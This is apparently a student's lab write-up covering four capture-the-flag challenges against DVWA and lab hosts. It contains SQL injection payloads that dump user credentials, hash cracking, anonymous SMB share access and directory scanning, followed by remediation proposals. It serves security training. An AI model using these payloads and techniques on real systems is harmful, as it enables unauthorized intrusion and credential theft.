## Methodology

The project was executed in a controlled lab environment using a Kali Linux virtual machine customized for ethical hacking. Below is a detailed breakdown of each challenge.



### Challenge 1: SQL Injection (25 Points)

- **Objective**: Retrieve Bob Smith’s account credentials, crack the password, access a flag file at `192.168.0.10`, and propose SQL injection remediation.

- **Detailed Steps**:

  1. **Preliminary Setup**:

     <p align="center">

  <img src="images/login_dvwa.png" width="300"/>

     </p>
     - Navigated to `http://10.5.5.12` using Firefox on Kali Linux.

     - Logged into DVWA with credentials `admin/password`.

     - Accessed the DVWA Security page, set the security level to `Low`, and submitted the change.

     - Verified the security level update in the DVWA interface.



  3. **Confirming SQL Injection Vulnerability**:

     - Navigated to the SQL Injection module at `http://10.5.5.12/vulnerabilities/sqli/`.

     - Entered the payload `' OR 1=1 #` in the User ID field and clicked Submit.

     - Observed the output displaying all user records:



       <p align="center">

  <img src="images/first_injection.png" width="300" alt="Confirming SQL Injection vulnerability by retrieving all user records"/>

  </p>



     - **Explanation**: The payload `' OR 1=1 #` appends an always-true condition, bypassing the ID check, and `#` comments out trailing query parts, returning all `users` table records.



     



  3. **Determining Number of Fields**:

     - I entered `1' ORDER BY 1 #`, `1' ORDER BY 2 #`, and `1' ORDER BY 3 #` in the User ID field.

     - The first two returned normal responses; the third returned an error: `Unknown column '3' in 'order clause'`.

     - **Explanation**: The `ORDER BY` tests revealed the query involves two fields.

       



  4. **Checking DBMS Version**:

     - Entered `1' OR 1=1 UNION SELECT 1, VERSION()#` and observed:



       <p align="center">

  <img src="images/union_select_version.png" width="300"/>

  </p>



     - **Explanation**: The `output` indicates that the DBMS is MySQL version 5.5.58 running on Debian.



  5. **Determining Database Name**:

     - I entered `1' OR 1=1 UNION SELECT 1, DATABASE()#` and observed:



       <p align="center">

  <img src="images/union_select_database.png" width="300"/>

  </p>



     - **Explanation**: The `DATABASE()` function identified the database as `dvwa`.



  6. **Retrieving Table Names**:

     - I entered `1' OR 1=1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#`.

     - Observed:



       <p align="center">

  <img src="images/tables.png" width="300"/>

  </p>



     - **Findings**: Identified `guestbook` and `users` tables; prioritized `users` for credentials.



  7. **Retrieving Column Names**:

     - I entered `1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'#`.

     - Identified columns: User accounts

     - **Findings**: Focused on `user` and `password` column for credential extraction.
       
     <p align="center"> <img src="images/column.png" width="300" alt="Retrieving usernames and password hashes, including Bob Smith’s, via SQL injection"/> </p>



  8. **Retrieving User Credentials**:

     - I entered `1' OR 1=1 UNION SELECT user, password FROM users #` and observed:
     <p align="center"><img src="images/users.png" width="300" alt="Retrieving usernames and password hashes, including Bob Smith’s, via SQL injection"/> </p>

     - **Findings**: Retrieved Bob Smith’s username (`smithy`) and MD5 hash.



  9. **Cracking Bob Smith’s Password**:

     - I Identified hashes as MD5 (32-character hexadecimal).

     - I navigated to `https://crackstation.net`, pasted Bob Smith’s hash, and clicked “Crack Hashes”.

     - I retrieved the plaintext password as ‘password’

     <p align="center"> <img src="images/crackstation.png" width="300" alt="Retrieving usernames and password hashes, including Bob Smith’s, via SQL injection"/> </p>



     - **Cracking Explanation**:

       - CrackStation uses precomputed rainbow tables to match MD5 hashes to common passwords.

       - The instant result indicated a weak password, typical in low-security settings.

       - Verified the password by logging into DVWA with `smithy:<password>`.

       <p align="center"> <img src="images/logged_in.png" width="300" alt="Successful login to DVWA as Bob Smith"/> </p>



  10. **Accessing the Challenge File**:

      - Used `smithy:<password>` to SSH into `192.168.0.10`:

        ```bash

        ssh smithy@192.168.0.10

        ```

      - Navigated to `/home/smithy`, located `my_passwords.txt`:

        ```bash

        ls

        my_passwords.txt

        ```

      - I cat the file content and recorded the challenge code.

      <p align="center"> <img src="images/flag1.png" width="300" alt="Accessing Flag 1"/> </p>



### Challenge 2: Web Server Vulnerabilities (25 Points)

- **Objective**: Identify directories on `10.5.5.12` with indexing enabled and propose remediation.

- **Steps**:

  1. **Preliminary Setup**:

     - Logged into `http://10.5.5.12` with `admin/password` and set DVWA security to `low`.

  2. **Reconnaissance**:

     - Ran `dirb` to scan directories:

       ```bash

       dirb http://10.5.5.12 -o dirb_output.txt

       ```

     - Identified directories with indexing enabled (`/config/`, `/docs/`, `/external/`) :

     <p align="center"> <img src="images/dirb.png" width="300”/> </p>


     - Iccessed all directories in the browser to confirm file listings.

     <p align="center"> <img src="images/dirb_list.png" width="300" alt="Directory indexing vulnerability exposing files on `10.5.5.12`."/> </p>


     - The flag file was ‘db_form.html’ found in ‘/config/‘

     <p align="center"> <img src="images/flag2.png" width="300" alt="flag 2."/> </p>

   



### Challenge 3: Exploit open SMB Server Shares (25 Points)

- **Objective**: Scan the `10.5.5.0/24` network for SMB targets, enumerate shares, retrieve the 3rd flag file, and propose remediation.

- **Detailed Steps**:

  1. **Network Scanning with Nmap**:

     - Scanned the `10.5.5.0/24` network to identify hosts with SMB services (port 139 & 445):



     <p align="center"> <img src="images/nmap.png" width="300" alt="flag 2."/> </p>



     - **Explanation**: The `-p 139,445` targets the SMB port, `-sV` finds SMB Service and its version.

     - **Findings**: Identified potential SMB host (`10.5.5.14`) with opened ports 139 and 445 which suggests that the target system is capable of file sharing, potentially exposing it to various vulnerabilities.




  2. **SMB Enumeration with enum4linux**:

     - I utilized `enum4linux` which is `an information gathering tool` in enumerating shares on the target machine. `10.5.5.14`:

     <p align="center"> <img src="images/shares.png" width="300" alt="Scanning `10.5.5.0/24` for SMB targets using Nmap."/> </p>



     - **Explanation**: The `-S` option performs share listings.

     - **Findings**: Identified four shares of which `workfiles` and `print$` were accessible without a valid user login.

  3. **Accessing Shares with smbclient**:

     - Listed shares on `target`:

       ```bash

       smbclient -L //10.5.5.14

       ```

     - **Findings**: Confirmed the `print$` share was accessible without credentials.

     - Connected to the `print$` share:

       ```bash

       smbclient //10.5.5.14/print$/OTHER

       ```

     - Listed files and downloaded `sxij42.txt`:

       ```bash

       ls

       get sxij42.txt

       ```

     - Viewed the file locally:

       ```bash

       cat sxij42.txt

       ```

     - **Explanation**: The anonymous access indicated a misconfiguration, allowing retrieval of the 3rd challenge code.

     <p align="center"> <img src="images/flag3.png" width="300" alt="Enumerating and accessing the `public` SMB share on `10.5.5.14` to retrieve the flag file."/> </p>

      



  4. **Remediation Research**:

     - I proposed methods to secure SMB services.



### Challenge 4: PCAP File Analysis (25 Points)

- **Objective**: Analyze `SA.pcap` to identify the target IP, directories, 4th challenge code, and propose remediation.

- **Steps**:

  1. **PCAP Analysis**:

     - Opened `SA.pcap` in Wireshark:

       ```bash

       wireshark /home/kali/Downloads/SA.pcap &

       ```

     - Applied an HTTP filter:

       ```

       http

       ```

     - Identified the target IP (`10.5.5.11`) and other URLs from which the  URL (`http://10.5.5.11/data`) contained the challenge file when checked.

  2. **Directory Investigation**:

     - Visited the URL in the browser to retrieve the Challenge 4 code.

     - Explored two files it contained to realize `/user_accounts.xlm/`) contained the 4th challenge code.

  3. **Remediation Research**:

     - I proposed methods to prevent clear-text transmission and unauthorized access.

## Remediation Proposals

- **SQL Injection (Challenge 1)**:

  1. Filter inputs to reject malicious SQL code.

  2. Use prepared statements to sanitize inputs.

  3. Apply least privilege to database accounts.

  4. Keep databases patched and updated.

  5. Deploy a WAF to block SQL injection attempts.



- **Web Server Vulnerabilities (Challenge 2)**:

  1. Disable directory indexing.

  2. Restrict sensitive directories with authentication.



- **SMB Server Vulnerabilities (Challenge 3)**:

  1. Disable SMBv1 and enforce SMBv3 with encryption.

  2. Require strong authentication, disable anonymous access.



- **Clear-Text Transmission and Unauthorized Access (Challenge 4)**:

  1. Enforce HTTPS with TLS 1.3.

  2. Use secure protocols like SFTP.

  3. Implement RBAC for file access: Give access to files based on a user’s role, not just their individual identity.

  4. Audit file permissions regularly.



## Challenges and Lessons Learned

- **SQL Injection**: I could have used sqlmap for automation but crafting manual payloads required that I had schema understanding; manual exploitation enhanced my query knowledge.

- **SMB Enumeration**: Scanning `10.5.5.0/24` revealed multiple potential targets; enum4linux provided critical share details.

- **Password Cracking**: CrackStation’s speed highlighted weak password risks.

- **PCAP Analysis**: Filtering HTTP packets improved efficiency :)

- **Overall**: Manual techniques and documentation deepened my cybersecurity expertise of which I’m very happy about.
